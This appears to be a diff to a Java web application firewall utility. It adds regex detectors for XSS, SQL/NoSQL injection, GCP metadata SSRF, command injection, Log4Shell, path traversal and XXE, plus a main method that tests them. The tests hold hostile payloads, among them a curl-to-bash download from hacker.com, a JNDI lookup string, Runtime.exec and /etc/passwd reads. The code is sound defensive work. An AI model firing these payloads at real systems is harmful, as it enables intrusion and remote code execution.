@@ -18,108 +18,157 @@
 
 package com.jservlet.nexus.shared.web.filter;
 
-import java.util.LinkedList;
 import java.util.List;
 import java.util.regex.Pattern;
 
 /**
- * WAF Utilities check for potential evasion inside a query or parameters, headers, cookies and Json Body!:
+ * Modern WAF defense Utilities. Check for potential evasion inside a query or parameters, headers, cookies and Json Body!
  * <p>
- * - XSS script injection<br>
- * - SQL injection<br>
- * - Google injection<br>
- * - Command injection<br>
- * - File injection<br>
- * - Link injection<br>
- * - Suspicious characters injection<br>
+ * - XSS script injection evasion (various encoding, obfuscation, template injections)<br>
+ * - SQL injection (commands, functions, params and NoSQL)<br>
+ * - Google injection (GCP/Google Cloud Platform - GCP Metadata server)<br>
+ * - Command injection & RCE (Remote code execution)<br>
+ * - File injection (LFI/RFI& path traversal)<br>
+ * - Java injection (RCE, SSTI & deserialization)<br>
+ * - XXE injection (Xml External Entity)<br>
+ * - Suspicious characters injection (excessive special char, unusual length/structure)<br>
+ * - Link injection (mailto or ftp)<br>
+ * - User-Agent Automates scanner/analyser<br>
+ * - AI User-Agent (Bots Agent, LLM training)<br>
  * </p>
  */
 public class WAFUtils {
 
+    private WAFUtils() {
+        throw new UnsupportedOperationException("Utility class");
+    }
+
     /**
      * Potential XSS (script injection) evasion. WAF query, params, headers and cookies!
      * Covers various encoding, obfuscation, HTML tags, attributes, and JavaScript execution.
+     * Data URIs, SVG/MathML vectors, Vue/AngularJS/React template injections, and deeply obfuscated javascript:
      */
-    public static List<Pattern> xssPattern = new LinkedList<>(List.of(
+    public static final List<Pattern> XSS_PATTERNS = List.of(
             // Detects obfuscated characters: Unicode escape sequences, Hexadecimal HTML entities, ASCII tag "< 60 0x3C" HTML Car Déc Hex, HTML comment opening hide malicious script
-            Pattern.compile("(?s)(?i)\\\\u[0-9a-fA-F]{4}|&#x[0-9a-fA-F]{2}|(?:\\x5cx[0-9a-fA-F]{2}|[\"']\\s*+>)|(?:<|&lt;?|%3C|¼|&#0*+60;?|&#x0*+3c;?|\\\\(?:x|u00)3c)!--", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),
+            Pattern.compile("(?si)\\\\u[0-9a-fA-F]{4}|&#x0*[0-9a-fA-F]{2};?|&#[0-9]{2,5};?|(?:\\x5cx[0-9a-fA-F]{2}|[\"']\\s*+>)|(?:<|&lt;?|%3C|&#x0*3c;|\\\\u003c)!--"),
             // General XSS payloads: script tags, common event handlers, javascript: URIs, data: URIs, HTML entities, various encodings (unicode, URL, hex), and common JavaScript functions.
-            Pattern.compile("(?s)(?i)" +
-                    "(?:<|&lt;?|%3C|¼|&#0*+60;?|&#x0*+3c;?|\\\\(?:x|u00)3c)" + // Detect ASCII tag "< &lt %3C #60 0x3C" HTML Char Décimal Hexa
-                    "(?:script|body|html|table|xss|style|bgsound|portal|picture|fencedframe|a|template|track|canvas|video|source|audio|object|embed|applet|i?frame|form|input|option|blockquote|area|map|link|base|layer|div|span|img|meta)|" + // Search HTML tags
-                    "on(?:afterprint|beforeprint|beforeunload|hashchange|message|offline|line|pagehide|pageshow|popstate|storage|unload|contextmenu|input|invalid|search|mousewheel|wheel|drag|dragend|dragenter|dragleave|dragover|dragstart|drop|scroll|copy|cut|paste|abort|blur|change|click|dblclick|dragdrop|error|focus|keydown|keypress|keyup|load|mousedown|mousemove|mouseout|mouseover|mouseup|move|reset|resize|select|submit|(?:before)?unload)" + // on all known Event handlers
-                    "\\s*+=|\\.cookie|" + // matches any whitespace + cookie !?
-                    "(?:execScript|escape|unescape|alert|confirm|prompt|msgbox|eval|expression)\\s*+\\(|(?:^|\\s+|\\.)(?:this|top|parent|document)\\.[a-zA-Z0-9_%]+|" + // Detect JS functions
-                    "(?:java|vb)script\\s*+:|(?:dyn|low)src|void\\s*+\\(0\\)|http-equiv|text/" + // Detect URI schemes
-                    "(?:x-)?scriptlet|fromCharCode|\\.\\s*+href\\s*+=|getElements?By(?:Tag)?(?:Name|Id)\\s*+\\(|\\.\\s*+captureEvents\\s*+\\(|\\.\\s*+create(?:Attribute|Element|TextNode)\\s*+\\(|\\.\\s*+write(?:ln)?\\s*+\\(|\\.\\s*+re(?:place|load)?\\s*+\\(|" + // Detect JS manipulate HTML elements or attributes based
-                    "(?:style|class)\\s*+=|(?:href|src|source|action)\\s*+=\\s*+[\"']|@import|(?:behavior|image|binding)\\s*+:\\s*+url\\s*+\\(|background\\s*+=\\s*+['\"]|" + // Detect Location Resources and CSS
-                    "AllowScriptAccess\\s*+=|(?:<|&lt;?|%3C|¼|&#0*+60;?|&#x0*+3c;?|\\\\(?:x|u00)3c)[?!]\\s*+(?:import|entity|xml)|!\\[CDATA|DATA(?:SRC|FLD|FORMATAS)\\s*+=|Set-?Cookie|new\\s+(ActiveXObject|XMLHttpRequest)\\s*+\\(|schemas-microsoft-com|:namespace|Microsoft\\.XMLHTTP|window\\s*+.\\s*+open\\s*+\\(|\\.\\s*+action\\s*+=|;\\s*+url\\s*+=|(acunetix|nikto|sqlmap|nmap|nessus|w3af|openvas|zap|burp)\\s*+web\\s*+vulnerability\\s*+scanner|res://ieframe\\.dll", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL) // Detect Misc/Scanner HTML entities + JS/ActiveX
-    ));
+            Pattern.compile("(?si)(?:<|&lt;?|%3C|&#x0*3c;|\\\\u003c)\\s*\\b(?:script|body|html|table|xss|style|bgsound|portal|picture|fencedframe|a|template|track|canvas|video|source|audio|object|embed|applet|i?frame|form|input|option|blockquote|area|map|link|base|layer|div|span|img|meta|math|svg)\\b|" +
+                    "\\bon(?:afterprint|beforeprint|beforeunload|hashchange|message|offline|line|pagehide|pageshow|popstate|storage|unload|contextmenu|input|invalid|search|mousewheel|wheel|drag|dragenter|dragleave|dragover|dragstart|drop|scroll|copy|cut|paste|abort|blur|change|click|dblclick|error|focus|keydown|keypress|keyup|load|mousedown|mousemove|mouseout|mouseover|mouseup|reset|resize|select|submit|pointerdown|pointerup)\\b\\s*=|" +
+                    "\\.cookie\\b|\\b(?:execScript|alert|confirm|prompt|msgbox|eval|expression)\\s*\\(|" +
+                    "\\b(?:java|vb)script\\s*[:\\s]|\\bvoid\\s*\\(0\\)|\\bhttp-equiv\\b|\\bfromCharCode\\b|" +
+                    "\\.\\s*href\\s*=|\\bgetElements?By(?:Tag)?(?:Name|Id)\\b\\s*\\(|" +
+                    "\\bcreate(?:Attribute|Element|TextNode)\\b\\s*\\(|" +
+                    "\\.(?:write(?:ln)?|innerHTML|outerHTML|textContent|setAttribute)\\b\\s*[=(]|" +
+                    "@import\\b|\\bbackground\\s*=\\s*['\"]|\\bAllowScriptAccess\\b\\s*=|" +
+                    "\\bdata:(?:text/html|image/svg\\+xml|application/javascript)\\b|\\{\\{.*\\}\\}") //  Data URIs & Template {{ }}
+    );
 
     /**
-     * Potential SQL injection evasion. SQL query commands, functions, params
+     * Potential SQL injection evasion. SQL query commands, functions, params and NoSQL Injection
      */
-    public static List<Pattern> sqlPattern = new LinkedList<>(List.of(
-            Pattern.compile("(?s)(?i)'\\s*+(?:;|--|#)|;\\s*+--|or\\s+'?1'?\\s*+=\\s*+'?1'?|or\\s+'?0'?\\s*+=\\s*+'?0'?|and\\s+'?1'?\\s*+=\\s*+'?0'?|and\\s+'?0'?\\s*+=\\s*+'?1'?|and\\s+'?1'?\\s*+=\\s*+'?2'?|and\\s+'?2'?\\s*+=\\s*+'?1'?|and\\s+'?1'?\\s*+=\\s*+'?1'?|'\\s*+(?:or|and|where|not|union)\\s+", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL),
-            Pattern.compile("(?s)(?i)delete\\s+from|drop\\s+table|create\\s+(?:or\\s+replace\\s+)?(?:table|view|package|index|constraint)|update\\s+.+\\s+set\\s+.+\\s*+=|(?:insert\\s+into\\s+.+(?:\\s+|\\))values|select\\s+.*?(?:\\*|,\\s*+\\w+\\s*+|dummy).*?\\s+from|union.+select.+from|IF\\s*+\\(\\s*+USER\\s*+\\(\\s*+\\)\\s*+LIKE|root@%|BENCHMARK\\s*+\\(\\s*+[0123456789*+-]+\\s*+,\\s*+SHA1\\s*+\\([^)]*+\\)|exec.+[xs]p_|into\\s+(?:out|dump)file|;\\s*+GO\\s+EXEC|cmdshell\\s*+\\(|;\\s*+(?:drop|truncate|delete|insert|select|update|alter|create)\\s+(?:table|view|index|package|constraint|user|trigger|or\\s+replace)|user_name\\s*+\\(\\s*+\\))|LIKE\\s+'%|AND\\s+(?:\\(\\s+)?ROWNUM\\s*+[=<>]|AS\\s+.+\\s+FROM\\s+DUAL", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL)
-    ));
+    public static final List<Pattern> SQL_PATTERNS = List.of(
+            Pattern.compile("(?si)'\\s*+(?:;|--|#)|;\\s*+--|\\b(?:or|and)\\s+'?[0-9a-zA-Z]+'?\\s*+=\\s*+'?[0-9a-zA-Z]+'?|'\\s*+(?:or|and|where|not|union)\\b"),
+            Pattern.compile("(?si)(?:['\";)]|/\\*|--)\\s*\\b(?:delete\\s+from|update\\s+\\w+\\s+set|insert\\s+into|select\\s+[^;]{1,100}?\\s+from)\\b"),
+            Pattern.compile("(?si)\\b(?:union\\s+(?:all\\s+)?select|drop\\s+(?:table|database|user)|create\\s+table|benchmark\\s*\\(|exec\\s+xp_|into\\s+outfile|cmdshell|user_name\\s*\\(|information_schema|waitfor\\s+delay|pg_sleep|dbms_pipe\\.receive_message|sleep\\s*\\()\\b"),
+            // NoSQL Injection (MongoDB, CouchDB) often targeting REST JSON APIs
+            Pattern.compile("(?si)\"(?:\\$eq|\\$ne|\\$gt|\\$gte|\\$lt|\\$lte|\\$in|\\$nin|\\$exists|\\$type|\\$regex|\\$where)\"\\s*:")
+    );
 
     /**
-     * Potential google hack
+     * Modern Google / GCP (Google Cloud Platform) Threats & Cloud Dorking
+     * SSRF on GCP Metadata server (Critical for Google Cloud hosted apps)
+     * Abuse of Google Workspace (Apps Script, Drive) for data exfiltration or Open Redirects
+     * Google API Key & Service Account injection/stealing
+     * Modern Dorking operators targeting cloud credentials (used in local search abuse)
      */
-    public static List<Pattern> googlePattern = new LinkedList<>(List.of(
-            Pattern.compile("(?s)(?i)google.*?inurl.*?(?:(?:pass|(?:wd|word|wort|list))|admin|(?:up|down)load|sendmail)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL)
-    ));
+    public static final List<Pattern> GOOGLE_PATTERNS = List.of(
+            // GCP Metadata SSRF Attack (Preventing server from fetching its own cloud credentials)
+            Pattern.compile("(?si)(?:metadata\\.google\\.internal|169\\.254\\.169\\.254)(?:/computeMetadata/v1/|/v1/|/beta/)?"),
+
+            // Google Workspace Abuse (Malicious Apps Script / Drive used as Command & Control or Data Exfiltration)
+            Pattern.compile("(?si)https?://(?:script\\.google\\.com/macros/s/[a-zA-Z0-9_-]+|drive\\.google\\.com/uc\\?export=download|storage\\.googleapis\\.com/[a-z0-9_.-]+)"),
+
+            // Google API Key & OAuth abuse (Detects 'AIza' API keys or OAuth Client IDs passed anomalously)
+            // (WARN Note: If your app legitimately expects users to input Google API keys, remove this specific pattern)
+            Pattern.compile("(?s)AIza[0-9A-Za-z-_]{35}|[0-9]+-[0-9a-zA-Z_]{32}\\.apps\\.googleusercontent\\.com"),
+
+            // Modern Google Dorking (Local search abuse or Referer checking)
+            Pattern.compile("(?si)\\b(?:inurl|intitle|intext|filetype|ext)\\s*:\\s*(?:env|credentials|service_account|rsa|id_rsa|pem|log|sql|bak|config|htpasswd)\\b")
+    );
 
     /**
-     * Potential command injection
+     * Command injection & RCE (remote code execution)
+     * Linux piping (`|`), backticks, $() execution, and out-of-band network commands (curl, wget, nc).
      */
-    public static List<Pattern> commandPattern = new LinkedList<>(List.of(
-            Pattern.compile("(?s)(?i)cmd(\\.exe|=dir)|\\.dll|uname|cmdshell|format\\s+[CDE]['\"]|#exec|/bin/ls|;(/usr)?/s?bin/", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL)
-    ));
+    public static final List<Pattern> COMMAND_PATTERNS = List.of(
+            Pattern.compile("(?si)cmd(?:\\.exe|=dir)|\\.dll|\\buname\\b|cmdshell|format\\s+[CDE]['\"]|#exec|/bin/(?:ls|sh|bash|zsh)|;(/usr)?/s?bin/"),
+            Pattern.compile("(?si)(?:\\||&&|;|\\n|\\r|`|\\$\\()\\s*(?:curl|wget|nc|netcat|bash|sh|zsh|powershell|ping|nslookup|dig|awk|sed|python|perl|ruby)\\b")
+    );
 
     /**
-     * Potential file disclosure
+     * Modern Java specific RCE (Remote Code Execution), SSTI (templates) & deserialization (Log4Shell, SpEL, OGNL)
      */
-    public static List<Pattern> filePattern = new LinkedList<>(List.of(
-            Pattern.compile("(?s)(?i)/(?:var/log|boot|etc|sbin|root)/|etc/(?:passwd|init\\.d|users|groups|hosts)|\\.bash_(?:rc|history)|WS_FTP.LOG|_notes/.+\\.mno|(?:phpinfo|test)\\.php|(?:web|config|ejb-jar|weblogic|citydesk|contribute)\\.xml|\\.ht(?:access|passwd)|httpd\\.conf|conf\\.d|c:[/\\\\](?:windows|system32|boot\\.ini)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL)
-    ));
+    public static final List<Pattern> JAVA_RCE_PATTERNS = List.of(
+            // Log4Shell (CVE-2021-44228) and variants
+            Pattern.compile("(?si)\\$\\{\\s*(?:jndi|jndi:ldap|jndi:rmi|jndi:dns|jndi:nis|jndi:iiop|jndi:corba|jndi:ndsn|sys|env|lower|upper)\\s*:"),
+            // Java Reflection, Runtime execution, and Fastjson/Jackson bypasses
+            Pattern.compile("(?si)\\b(?:java\\.lang\\.Runtime|ProcessBuilder|java\\.lang\\.reflect|java\\.io\\.File|java\\.net\\.URL)\\b|@type[\"']?\\s*:|getClass\\(\\)\\.getClassLoader\\(\\)")
+    );
+
+    /**
+     * Potential file inclusion (LFI/RFI) & path traversal
+     * Advanced dot-dot-slash obfuscation (%2e%2e%2f) and PHP/File wrappers (php://, file://)
+     */
+    public static final List<Pattern> FILE_PATTERNS = List.of(
+            Pattern.compile("(?si)/(?:var/log|boot|etc|sbin|root)/|etc/(?:passwd|shadow|init\\.d|users|groups|hosts)|\\.bash_(?:rc|history|profile)|WS_FTP\\.LOG|_notes/.*\\.mno|(?:phpinfo|test)\\.php|(?:web|config|ejb-jar|weblogic|citydesk|contribute)\\.xml|\\.ht(?:access|passwd)|httpd\\.conf|conf\\.d|c:[/\\\\](?:windows|system32|boot\\.ini)"),
+            // Advanced Path Traversal (e.g., ../, ..\, %2e%2e%2f)
+            Pattern.compile("(?si)(?:\\.{2,}|%2e%2e|%252e%252e)(?:/|\\\\|%2f|%5c|%252f|%255c)"),
+            // LFI/RFI Wrappers
+            Pattern.compile("(?si)\\b(?:php|file|zip|dict|expect|ftp|http|https)://(?:filter|input|\\.\\.)")
+    );
 
     /**
      * Potential link injection (reframing?)
      */
-    public static List<Pattern> linkPattern = new LinkedList<>(List.of(
-            Pattern.compile("(?i)mailto:|ftp://", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL)
-    ));
+    public static List<Pattern> LINK_PATTERNS = List.of(
+            Pattern.compile("(?i)mailto:|ftp://")
+    );
+
+    /**
+     * Potential Xml External Entity (XXE) injection
+     * Critical for REST APIs parsing XML payloads or SOAP services.
+     */
+    public static final List<Pattern> XXE_PATTERNS = List.of(
+            Pattern.compile("(?si)<\\!DOCTYPE\\s+[^>]*\\b(?:SYSTEM|PUBLIC)\\b|<\\!ENTITY\\s+[^>]*\\b(?:SYSTEM|PUBLIC)\\b")
+    );
 
     /**
      * Generic suspicious patterns (e.g., excessive special characters, unusual length/structure)
      */
-    public static List<Pattern> suspiciousPattern = new LinkedList<>(List.of(
-            Pattern.compile(
-                    "[^\\x20-\\x7E]{2,}|" + // Non-ASCII printable characters (2 or more)
-                            "(?:[\\x00-\\x1F\\x7F]){2,}|" + // Control characters (2 or more)
-                            "\\.{5,}|" + // Excessive dots (e.g., path traversal attempts)
-                            "\\s{10,}|" + // Excessive whitespace
-                            "(?:%[0-9a-fA-F]{2}){5,}|" + // Excessive URL encoding
-                            "([\"'`=\\(\\)\\[\\]{};:])\\1{2,}" // Repetition of special characters
-                    , Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL
+    public static final List<Pattern> SUSPICIOUS_PATTERNS = List.of(
+            Pattern.compile("(?si)(?:[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F]){2,}|" + // Control characters (excluding \t, \n, \r)
+                    "\\.{10,}|" + // Excessive dots (e.g., buffer overflows or crazy traversal)
+                    "(?:%[0-9a-fA-F]{2}){10,}" // Excessive continuous URL encoding
             )
-    ));
+    );
 
     /**
      * Potential User-Agent patterns indicating scanners, bots, or malicious activity.
      */
-    public static List<Pattern> userAgentPattern = new LinkedList<>(List.of(
-            Pattern.compile(
-                    "(?i)(?:acunetix|nikto|sqlmap|nmap|nessus|w3af|openvas|zap|burp(?:suite)?|commix|arachni|grendel-scan|netsparker|vega|skipfish|dirbuster|gobuster|ffuf|wfuzz|autoswagger2|testphp\\.vulnweb\\.com|webinspect|dotdotpwn|havij|xss-proxy|masscan|hydra|medusa|patator|john|hashcat|cewl|enum4linux|sublist3r|theharvester|amass|crt\\.sh|shodan|censys|metasploit|msfconsole|exploit-db|searchsploit|nuclei|httpx|dirb|wpscan|joomscan|droopescan|whatweb|cmsmap|sn1per|recon-ng|sparta|legion|maltego|spiderfoot|osint-framework|dmitry|fierce|dnsenum|dnsrecon|subfinder|assetfinder|waybackurls|gau|katana|hakrawler|paramspider|qsreplace|kxss|dalfox|xss-hunter|bounty-hunter|cve-|exploit-|vulnerability-|scan-|bot-|crawler-|spider-|wget|curl|python-requests|go-http-client|java/\\d+\\.\\d+\\.\\d+|php/\\d+\\.\\d+\\.\\d+|ruby/\\d+\\.\\d+\\.\\d+|perl/\\d+\\.\\d+\\.\\d+)",
-                    Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL
-            )
-    ));
+    public static final List<Pattern> USER_AGENT_PATTERNS = List.of(
+            Pattern.compile("(?si)(?:acunetix|nikto|sqlmap|nmap|nessus|w3af|openvas|zap|burp(?:suite)?|commix|arachni|netsparker|vega|skipfish|dirbuster|gobuster|ffuf|wfuzz|webinspect|dotdotpwn|havij|xss-proxy|masscan|hydra|medusa|metasploit|nuclei|dirb|wpscan|joomscan|droopescan|whatweb|cmsmap|sn1per|recon-ng|sparta|legion|spiderfoot|osint-framework|dmitry|fierce|dnsenum|dnsrecon|subfinder|assetfinder|waybackurls|gau|katana|hakrawler|paramspider|kxss|dalfox|xss-hunter|bounty-hunter|python-requests|go-http-client|java/\\d+|php/\\d+|ruby/\\d+|perl/\\d+)")
+    );
 
-    public static boolean isWAFPattern(String value, List<Pattern> patterns) {
+    /**
+     * Potential AI Crawler Bots - Blocks scraper bots used for LLM training.
+     */
+    public static final List<Pattern> AI_USER_AGENT_PATTERNS = List.of(
+            Pattern.compile("(?si)(?:GPTBot|OAI-SearchBot|ChatGPT-User|ClaudeBot|anthropic-ai|Google-Extended|Meta-ExternalAgent|FacebookBot|CCBot|Bytespider|Amazonbot|Cohere-ai|Omgilibot|PerplexityBot|Diffbot|ImagesiftBot|YouBot)")
+    );
+
+    private static boolean isWAFPattern(String value, List<Pattern> patterns) {
         if (value == null) return false;
-        // matcher sqlPattern find ?
+        // matcher pattern find ?
         for (Pattern pattern : patterns) {
             if (pattern.matcher(value).find())
                 return true;
@@ -127,9 +176,47 @@ public class WAFUtils {
         return false;
     }
 
+
     public static void main(String[] args) {
-        String test = "image/avif,image/webp,image/apng,image/svg+xml;q=0.8";
-        System.out.println(isWAFPattern(test, xssPattern));
+        // Advanced Test Payloads to verify improvements
+        String[] tests = {
+                // XSS & Template Injection
+                "<svg onload=alert(1)>",
+                "<video change=\"alert(this.ssss)\">",
+                "alert(this.qss)",
+                "<body change=\"this.fssf\">",
+                "this.1ssss@gmail.com",
+                "abort=\"prompt",
+                "abort=\"prompt(document.location.href",
+
+                "{{ 7 * 7 }}", // SSTI / Vue
+                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", // Data URI
+                // Java RCE & Deserialization
+                "${jndi:ldap://hacker.com/Exploit}",
+                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}",
+                "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")",
+                // NoSQL Injection (JSON body)
+                "\"$ne\": 1",
+                // OS Command Injection
+                "; curl http://hacker.com/shell.sh | bash",
+                // Advanced Path Traversal & LFI
+                "..%2f..%2f..%2fetc%2fpasswd",
+                "php://filter/convert.base64-encode/resource=index.php",
+                // XXE
+                "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+        };
+
+        System.out.println("--- Advanced WAF Pattern Tests ---");
+        for (String test : tests) {
+            boolean isCaught = isWAFPattern(test, XSS_PATTERNS) ||
+                    isWAFPattern(test, SQL_PATTERNS) ||
+                    isWAFPattern(test, COMMAND_PATTERNS) ||
+                    isWAFPattern(test, JAVA_RCE_PATTERNS) ||
+                    isWAFPattern(test, FILE_PATTERNS) ||
+                    isWAFPattern(test, XXE_PATTERNS);
+
+            System.out.printf("Caught: %-5b | Payload: %s%n", isCaught, test);
+        }
     }
 
 }
